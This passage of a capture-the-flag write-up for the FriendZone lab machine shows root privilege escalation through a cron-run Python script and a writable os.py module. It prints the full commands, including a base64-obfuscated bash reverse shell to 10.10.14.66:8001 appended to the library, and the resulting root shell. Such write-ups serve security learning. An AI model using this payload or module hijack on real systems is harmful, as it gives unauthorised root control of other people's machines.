13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Cron Jobs:</span></span></h3><div id="https://www.notion.so/2b40b98a88f78096b277cb5b405cb4fa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Root is running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/server_admin/reporter.py</code></span><span class="SemanticString"> every few minutes.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f7801d92c3cb9bcc8c64d6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>friend@FriendZone:~$</span></mark></span><span class="SemanticString"><span> ./pspy64 
+
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2025/11/13 16:25:20 CMD: UID=1000  PID=3262   | ./pspy64 
+2025/11/13 16:25:20 CMD: UID=0     PID=3245   | 
+2025/11/13 16:25:20 CMD: UID=1000  PID=3227   | -bash 
+2025/11/13 16:25:20 CMD: UID=1000  PID=3224   | sshd: friend@pts/1   
+2025/11/13 16:25:20 CMD: UID=1000  PID=3188   | (sd-pam) 
+2025/11/13 16:25:20 CMD: UID=1000  PID=3187   | /lib/systemd/systemd --user
+..SNIP..
+2025/11/13 16:25:20 CMD: UID=0     PID=2      | 
+2025/11/13 16:25:20 CMD: UID=0     PID=1      | /sbin/init splash 
+2025/11/13 16:26:01 CMD: UID=0     PID=3273   | /usr/bin/python /opt/server_admin/reporter.py 
+2025/11/13 16:26:01 CMD: UID=0     PID=3272   | /bin/sh -c /opt/server_admin/reporter.py 
+2025/11/13 16:26:01 CMD: UID=0     PID=3271   | /usr/sbin/CRON -f
+..SNIP..
+2025/11/13 16:28:01 CMD: UID=0     PID=3293   | /usr/bin/python /opt/server_admin/reporter.py 
+2025/11/13 16:28:01 CMD: UID=0     PID=3292   | /bin/sh -c /opt/server_admin/reporter.py 
+2025/11/13 16:28:01 CMD: UID=0     PID=3291   | /usr/sbin/CRON -f</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f780079712cf39c924c035" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, the script itself does nothing:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f7808bb3b8d610ba4d9cfa" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#!/usr/bin/python</span>
+
+<span class="token keyword">import</span> os
+
+to_address <span class="token operator">=</span> <span class="token string">"admin1@friendzone.com"</span>
+from_address <span class="token operator">=</span> <span class="token string">"admin2@friendzone.com"</span>
+
+<span class="token keyword">print</span> <span class="token string">"[+] Trying to send email to %s"</span><span class="token operator">%</span>to_address
+
+<span class="token comment">#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''</span>
+
+<span class="token comment">#os.system(command)</span>
+
+<span class="token comment"># I need to edit the script later</span>
+<span class="token comment"># Sam ~ python developer</span></span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f780819e39ce2247f51e75" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">friend</code></span><span class="SemanticString"> doesn’t own this script, nor have write access.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f7804da14bdccc76b38907" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>friend@FriendZone:~$</span></mark></span><span class="SemanticString"><span> ls -la /opt/server_admin/reporter.py 
+
+-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f780269b6ed7e8bc24afe0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, it can modify </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/user/lib/python2.7/os.py</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780e680b9dea0f27ea98c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>friend@FriendZone:~$</span></mark></span><span class="SemanticString"><span> find / -path /proc -prune -o -type f -writable 2&gt;/dev/null
+
+/etc/Development/shell.php
+/var/mail/friend
+/sys/kernel/security/apparmor/.remove
+/sys/kernel/security/apparmor/.replace
+/sys/kernel/security/apparmor/.load
+/sys/kernel/security/apparmor/.access
+/sys/fs/cgroup/memory/cgroup.event_control
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
+..SNIP..
+/usr/lib/python2.7/os.pyc
+/usr/lib/python2.7/os.py
+/proc</span></span></span></code></pre><h3 id="https://www.notion.so/2ab0b98a88f780639971f34ddb42ed89" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f780639971f34ddb42ed89"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Python Module Hijack:</span></span></h3><div id="https://www.notion.so/2b40b98a88f7809199dde1f95ba42246" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">According to </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.python.org/3/tutorial/modules.html">Python docs</a></span><span class="SemanticString">,</span></span></p></div><blockquote id="https://www.notion.so/2b40b98a88f780d9977ff4815da095e1" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">A module is a file containing Python definitions and statements. The file name is the module name with the suffix </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.py</code></span><span class="SemanticString"> appended.
+…
+A module can contain executable statements as well as function definitions. They are executed only the first time the module name is encounted in an import statement.</span></span></blockquote><div id="https://www.notion.so/2b40b98a88f7800ab0eed01096f2056b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Basically, when </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">reporter.py</code></span><span class="SemanticString"> imports the os module, it loads and executes </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">os.py</code></span><span class="SemanticString"> first, making its namespaces and functions available. Since I have write access to the module, I effective have control over </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">reporter.py</code></span><span class="SemanticString"> (and hence the cron job) as well.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780699541dd4d5ae15222" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll append a system call to the library, reusing the reverse shell payload from earlier:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780459dddcae55ebfea83" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>friend@FriendZone:~$</span></mark></span><span class="SemanticString"><span> echo &#x27;system(&quot;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjY2LzgwMDEgMD4mMQ== | base64 -d | bash&quot;)&#x27; &gt;&gt; /usr/lib/python2.7/os.py</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f780cd8a01c8d0e442a64b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After a minute or so, a root shell was sent back:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f7808ab268c2e59d123f67" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.66] from (UNKNOWN) [10.129.26.47] 59564
+bash: cannot set terminal process group (3416): Inappropriate ioctl for device
+bash: no job control in this shell
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@FriendZone:~#</span></mark></span><span class="SemanticString"><span> id
+
+uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><h3 id="https://www.notion.so/2ab0b98a88f780b590e3cf910a828bdc" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f780b590e3cf910a828bdc"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Root Flag:</span></span></h3><pre id="https://www.notion.so/2ab0b98a88f780eca90bf02d61df44fc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@FriendZone:~#</span></mark></span><span class="SemanticString"><span> cat root.txt
+
+67a0b215************************</span></span></span></code></pre><div id="https://www.notion.so/2ab0b98a88f78095bc27c27b855aebe6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2aa0b98a88f781eab95bf3c61e76c030" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
